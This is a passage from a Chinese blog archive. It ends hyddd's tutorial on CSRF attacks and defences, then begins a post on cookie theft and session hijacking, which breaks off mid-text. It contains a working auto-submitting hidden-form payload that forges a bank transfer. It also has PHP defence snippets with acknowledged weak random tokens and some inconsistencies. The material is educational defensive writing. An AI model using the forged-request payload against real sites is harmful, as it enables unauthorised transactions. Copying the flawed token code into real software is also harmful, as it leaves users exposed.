<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　<b style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;font-weight:bold;">示例3：</b></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　经过前面2个惨痛的教训，银行决定把获取请求数据的方法也改了，改用$_POST，只获取POST请求的数据，后台处理页面Transfer.php代码如下：</p>
<div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&lt;?php<br>　　　　session_start();<br>　　　　if&nbsp;(isset($_POST['toBankId']&nbsp;&amp;&amp;isset($_POST['money']))<br>　　　　{<br>　　　　&nbsp;&nbsp;&nbsp;&nbsp;buy_stocks($_POST['toBankId'],$_POST['money']);<br>　　　　}<br>　　?&gt;</div>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　然而，危险网站B与时俱进，它改了一下代码：</p>
<div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&lt;html&gt;　　&lt;head&gt;　　　　&lt;script&nbsp;type="text/javascript"&gt;　　　　　　function&nbsp;steal()<br>　　　　　　{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;　　　　 iframe&nbsp;=&nbsp;document.frames["steal"];<br>　　&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;　　&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iframe.document.Submit("transfer");<br>　　　　　　}<br>　　　　&lt;/script&gt;　　&lt;/head&gt;&lt;body&nbsp;onload="steal()"&gt;　　&lt;iframe&nbsp;name="steal"&nbsp;display="none"&gt;　　　　　　&lt;form&nbsp;method="POST"&nbsp;name="transfer"　action="http://www.myBank.com/Transfer.php"&gt;&lt;input&nbsp;type="hidden"&nbsp;name="toBankId"&nbsp;value="11"&gt;&lt;input&nbsp;type="hidden"&nbsp;name="money"&nbsp;value="1000"&gt;&lt;/form&gt;　　　　&lt;/iframe&gt;　　&lt;/body&gt;&lt;/html&gt;</div>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">如果用户仍是继续上面的操作，很不幸，结果将会是再次不见1000块......因为这里危险网站B暗地里发送了POST请求到银行!</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　总结一下上面3个例子，CSRF主要的攻击模式基本上是以上的3种，其中以第1,2种最为严重，因为触发条件很简单，一个&lt;img&gt;就可以了，而第3种比较麻烦，需要使用JavaScript，所以使用的机会会比前面的少很多，但无论是哪种情况，只要触发了CSRF攻击，后果都有可能很严重。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　理解上面的3种攻击模式，其实可以看出，CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><b style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;font-weight:bold;">五.CSRF的防御</b></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　我总结了一下看到的资料，CSRF的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的CSRF防御也都在服务端进行。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　<b style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;font-weight:bold;">1.服务端进行CSRF防御</b></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　(1).Cookie Hashing(所有表单都包含同一个伪随机值)：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　这可能是最简单的解决方案了，因为攻击者不能获得第三方的Cookie(理论上)，所以表单中的数据也就构造失败了:&gt;</p>
<div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　&lt;?php<br>　　　　//构造加密的Cookie信息　　　　$value=&nbsp;“DefenseSCRF”;<br>　　　　setcookie(”cookie”,$value,time()+3600);<br>　　?&gt;</div>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　在表单里增加Hash值，以认证这确实是用户发送的请求。</p>
<div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　&lt;?php　　　　$hash=md5($_COOKIE['cookie']);<br>　　?&gt;　　&lt;form&nbsp;method=”POST”&nbsp;action=”transfer.php”&gt;　　　　&lt;input&nbsp;type=”text”&nbsp;name=”toBankId”&gt;　　　　&lt;input&nbsp;type=”text”&nbsp;name=”money”&gt;　　　　&lt;input&nbsp;type=”hidden”&nbsp;name=”hash”&nbsp;value=”&lt;?=$hash;?&gt;”&gt;　　　　&lt;input&nbsp;type=”submit”&nbsp;name=”submit”&nbsp;value=”Submit”&gt;　　&lt;/form&gt;</div>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　然后在服务器端进行Hash值验证</p>
<div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&lt;?php<br>if(isset($_POST['check']))&nbsp;{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;　　&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $hash=md5($_COOKIE['cookie']);if($_POST['check']&nbsp;==$hash)&nbsp;{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;　　 doJob();<br>　　&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;else&nbsp;{<br>　　　　　　　　//...<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;　　 }<br>　　&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;else&nbsp;{<br>　　　　　　//...<br>　　&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;?&gt;</div>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　这个方法个人觉得已经可以杜绝99%的CSRF攻击了，那还有1%呢....由于用户的Cookie很容易由于网站的XSS漏洞而被盗取，这就另外的1%。一般的攻击者看到有需要算Hash值，基本都会放弃了，某些除外，所以如果需要100%的杜绝，这个不是最好的方法。<br>　　(2).验证码</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　这个方案的思路是：每次的用户提交都需要用户在表单中填写一个图片上的随机字符串，厄....这个方案可以完全解决CSRF，但个人觉得在易用性方面似乎不是太好，还有听闻是验证码图片的使用涉及了一个被称为MHTML的Bug，可能在某些版本的微软IE中受影响。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　(3).One-Time Tokens(不同的表单包含一个不同的伪随机值)</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　在实现One-Time Tokens时，需要注意一点：就是“并行会话的兼容”。如果用户在一个站点上同时打开了两个不同的表单，CSRF保护措施不应该影响到他对任何表单的提交。考虑一下如果每次表单被装入时站点生成一个伪随机值来覆盖以前的伪随机值将会发生什么情况：用户只能成功地提交他最后打开的表单，因为所有其他的表单都含有非法的伪随机值。必须小心操作以确保CSRF保护措施不会影响选项卡式的浏览或者利用多个浏览器窗口浏览一个站点。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　以下我的实现:</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　1).先是令牌生成函数(gen_token())：</p>
<div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&lt;?phpfunction&nbsp;gen_token()&nbsp;{<br>　　　　//这里我是贪方便，实际上单使用Rand()得出的随机数作为令牌，也是不安全的。<br>　　　　//这个可以参考我写的Findbugs笔记中的<a href="https://www.cnblogs.com/hyddd/articles/1391737.html" target="_blank" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;color:rgb(6, 85, 136);text-decoration:none;">《Random object created and used only once》</a><br>$token=md5(uniqid(rand(),true));return$token;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</div>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　2).然后是Session令牌生成函数(gen_stoken())：</p>
<div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&lt;?php<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;　　function&nbsp;gen_stoken()&nbsp;{<br>　　　　　　$pToken = "";<br>　　　　　　if($_SESSION[STOKEN_NAME]&nbsp; == $pToken){<br>　　　　　　　　//没有值，赋新值<br>　　　　　　　　$_SESSION[STOKEN_NAME]&nbsp;=gen_token();<br>　　　　　　}&nbsp;&nbsp;&nbsp; <br>　　　　　　else{<br>　　　　　　　　//继续使用旧的值<br>　　　　　　}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;　　}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;?&gt;</div>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　3).WEB表单生成隐藏输入域的函数：　　</p>
<div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&nbsp;&nbsp;&nbsp;&nbsp; &lt;?php<br>　　&nbsp;&nbsp;&nbsp;&nbsp; function gen_input() {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;　　&nbsp;&nbsp;&nbsp;&nbsp; gen_stoken();<br>　　&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo “&lt;input type=\”hidden\” name=\”" . FTOKEN_NAME . “\”<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;　　&nbsp;&nbsp;&nbsp;&nbsp; value=\”" . $_SESSION[STOKEN_NAME] . “\”&gt; “;<br>&nbsp;&nbsp;&nbsp;&nbsp; 　　}<br>&nbsp;&nbsp;&nbsp;&nbsp; ?&gt;</div>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　4).WEB表单结构：</p>
<div style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">&lt;?php<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;session_start();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include(”functions.php”);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;?&gt;&lt;form&nbsp;method=”POST”&nbsp;action=”transfer.php”&gt;&lt;input&nbsp;type=”text”&nbsp;name=”toBankId”&gt;&lt;input&nbsp;type=”text”&nbsp;name=”money”&gt;&lt;?&nbsp;gen_input();&nbsp;?&gt;&lt;input&nbsp;type=”submit”&nbsp;name=”submit”&nbsp;value=”Submit”&gt;&lt;/FORM&gt;</div>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　5).服务端核对令牌：</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　这个很简单，这里就不再啰嗦了。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　上面这个其实不完全符合“并行会话的兼容”的规则，大家可以在此基础上修改。</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　其实还有很多想写，无奈精力有限，暂且打住，日后补充，如果错漏，请指出:&gt;</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　PS：今天下午写这篇文档的时候FF崩溃了一次，写了一半文章的全没了，郁闷好久T_T.......</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">　　转载请说明出处，谢谢[hyddd(http://www.cnblogs.com/hyddd/)]</p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;"><b style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;font-weight:bold;">六.参考文献</b></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">[1].<a href="http://www.playhack.net/view.php?id=31" target="_blank" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;color:rgb(6, 85, 136);text-decoration:none;">Preventing CSRF</a></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">[2].<a href="http://shiflett.org/articles/cross-site-request-forgeries" target="_blank" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;color:rgb(6, 85, 136);text-decoration:none;">Security Corner: Cross-Site Request Forgeries</a></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">[3].<a href="http://netsecurity.51cto.com/art/200812/102951.htm" target="_blank" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;color:rgb(6, 85, 136);text-decoration:none;">《深入解析跨站请求伪造漏洞：原理剖析》</a></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">[4].<a href="http://netsecurity.51cto.com/art/200811/97281.htm" target="_blank" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;color:rgb(6, 85, 136);text-decoration:none;">《Web安全测试之跨站请求伪造（CSRF）》</a></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:1.5em;">[5].<a href="http://netsecurity.51cto.com/art/200812/102925.htm" target="_blank" style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;color:rgb(6, 85, 136);text-decoration:none;">《深入解析跨站请求伪造漏洞：实例讲解》</a></p>
<p style="margin:0px;padding:0px;border:0px none;font:inherit;vertical-align:baseline;margin-bottom:0px;">[6].http://baike.baidu.com/view/1609487.htm</p>
</div></div></div></div></div></div></div></div></div></div>
</div>
</div></body></html>
                </div>
                <div class="read-all">
                    <a  href="/2020/07/07/%E6%B5%85%E8%B0%88CSRF%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F-hyddd-%E5%8D%9A%E5%AE%A2%E5%9B%AD/"><i class="fa fa-newspaper-o"></i>Read All</a>
                </div>
                <hr>
              </li>
            
              <li>
                <h2>
                  <a class="post-link" href="/2020/07/07/cookie%E7%AA%83%E5%8F%96%E5%92%8Csession%E5%8A%AB%E6%8C%81-WEB%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/">cookie窃取和session劫持-WEB前端开发</a>
                </h2>
                <div class="label">
                    <div class="label-card">
                        <i class="fa fa-calendar"></i>2020-07-07
                    </div>
                    <div class="label-card">
                        <i class="fa fa-user"></i>tldsn
                        
                    </div>
                    <div class="label-card">
                        
                    </div>

                    <div class="label-card">
                    


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#印象笔记导入" title="Category: 印象笔记导入" rel="category">印象笔记导入</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


                    </div>

                    <div class="label-card">
                    
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
  

</span>

                    </div>
                </div>
                <div class="excerpt">
                    <html><head></head><body><div class="ennote"><div><br></div><div style="min-width: 100%;"><div style="background-color: transparent; vertical-align: baseline;"><div style="background-color: transparent; vertical-align: baseline; text-align: left;"><div style="margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;"><div style="margin: 0px auto; padding: 0px 2em; border: 0px none; vertical-align: baseline; z-index: 200; position: relative; width: 36em;"><div style="margin: 0px 25px 0px -25px; padding: 0px; border: 0px none; vertical-align: baseline; position: relative;"><div style="margin: 0px; padding: 0px 0px 9em; border: 0px none; vertical-align: baseline; position: relative;"><div style="margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><div style="margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; position: relative;"><div style="margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;"><div style="font-size: inherit; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;"><h1 style="border: 0px none; vertical-align: baseline; text-align: left; font-size: 35px; padding: 0px; margin: 0px;"><span style="font-size: 35px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">cookie窃取和session劫持</span></h1><div style="padding: 1.5em 0px; border: 0px none; font-size: inherit; vertical-align: baseline; position: relative; height: 1em; text-align: center; margin: 0px;"><div style="padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:absolute;left:-4em;top:50%;z-index:10;width:100%;padding-left:4em;padding-right:4em;height:0.1em;opacity:0.5;margin:0px;background:rgba(0, 0, 0, 0) -webkit-linear-gradient(0deg, rgb(243, 242, 238) 1%, rgb(31, 9, 9) 50%, rgb(243, 242, 238) 99%) repeat scroll 0% 0%;margin-bottom:0px;"></div></div></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">2014-08-18</span> <span style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">分类：<a href="https://www.html.cn/archives/category/develop-message" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">前端工具资源</a></span> <span style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">阅读(59523)</span> <span style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">评论(0)</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">Updates</span></div><ul style="font-size: inherit; padding: 0px; border: 0px none; vertical-align: baseline; margin: -1em 0px 1.5em 1.5em; list-style: disc;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">2014-08-17 感谢</span><a href="http://weibo.com/276653168" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">@搞前端的crosser</a><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">的提醒，加入了HTTP Response Splitting的内容。</span></div></li></ul><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">此篇文章的Presentation</span><a href="https://speakerdeck.com/shawn0102/cookie-theft-and-session-hijacking-1" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">戳这里</a><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">。</span></div><h2 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: bold;">一、cookie的基本特性</span></h2><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">如果不了解cookie，可以先到</span><a href="http://en.wikipedia.org/wiki/HTTP_cookie" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">wikipedia</a><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">上学习一下。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">http request</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">浏览器向服务器发起的每个请求都会带上cookie：</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Host: www.example.org</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Cookie: foo=value1;bar=value2</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Accept: */*</span></div></li></ol></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">http response</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">服务器给浏览器的返回可以设置cookie：</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">HTTP/1.1 200 OK</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Content-type: text/html</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Set-Cookie: name=value</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Set-Cookie: name2=value2; Expires=Wed,09 June 2021 10:18:32 GMT</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">(content of page)</span></div></li></ol></div><h2 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: bold;">二、cookie有关的术语</span></h2><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">session cookie</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">当cookie没有设置超时时间，那么cookie会在浏览器退出时销毁，这种cookie是session cookie。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">persistent cookie/tracking cookie</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">设置了超时时间的cookie，会在指定时间销毁，cookie的维持时间可以持续到浏览器退出之后，这种cookie被持久化在浏览器中。很多站点用cookie跟踪用户的历史记录，例如广告类站点会使用cookie记录浏览过哪些内容，搜索引擎会使用cookie记录历史搜索记录，这时也可以称作tracking cookie，因为它被用于追踪用户行为。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">secure cookie</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">服务器端设置cookie的时候，可以指定</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">secure</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">属性，这时cookie只有通过https协议传输的时候才会带到网络请求中，不加密的http请求不会带有secure cookie。设置secure cookie的方式举例：</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Set-Cookie: foo=bar; Path=/; Secure</span></div></li></ol></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">HttpOnly cookie</span></h3><div style="font-size: 